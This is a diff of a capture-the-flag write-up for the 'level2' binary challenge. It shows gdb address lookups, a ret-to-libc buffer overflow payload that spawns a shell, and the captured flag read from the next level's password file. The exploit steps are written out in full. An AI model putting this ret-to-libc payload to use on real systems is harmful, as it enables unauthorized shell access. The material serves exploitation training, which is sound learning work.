@@ -1,22 +1,57 @@
-# GDB
-(gdb) break p
+# level2
+
+## disassemble
+
+```shell
+objdump -dC -M intel level2
+```
+
+## ret to libc
+
+--> `system("/bin/sh")` : ret                 + system + "...." + "/bin/sh"
+                          "0x804854f"         + ...
+                          "\x4f\x85\x04\x08"  + ...
+
+```shell
+gdb level2
+(gdb) break main
 (gdb) run
 (gdb) print system
-  $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+--> `system("/bin/sh")` : ret                 + system              + "...." + "/bin/sh"
+                          "0x804854f"         + "0xb7e6b060"        + "...." + ...
+                          "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + ...
+
+```shell
 (gdb) info proc map
-  Start Addr   End Addr       Size     Offset objfile
-  [...]
-  0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-  [...]
+process 3420
+Mapped address spaces:
+        Start Addr  End Addr    Size      Offset  objfile
+        0xb7e2c000  0xb7fcf000  0x1a3000  0x0     /lib/i386-linux-gnu/libc-2.15.so
+
 find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
   0xb7f8cc58
   1 pattern found.
+```
 
-# Random RET
-080484d2 c3              RET
+--> `system("/bin/sh")` : ret                 + system              + "...." + "/bin/sh"
+                          "0x804854f"         + "0xb7e6b060"        + "...." + "0xb7f8cc58"
+                          "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7"
 
-#                            ... RET              ... system                    ... "/bin/sh"
-python2.7 -c 'print("X"*80 + "\xd2\x84\x04\x08" + "\x60\xb0\xe6\xb7" + "XXXX" + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
+
+## exploit
+
+```shell
+python2.7 -c 'print("X"*80 + "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
 cat /tmp/exploit.txt /dev/stdin | ./level2
+```
+
+## flag
+
+```shell
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+exit
+```
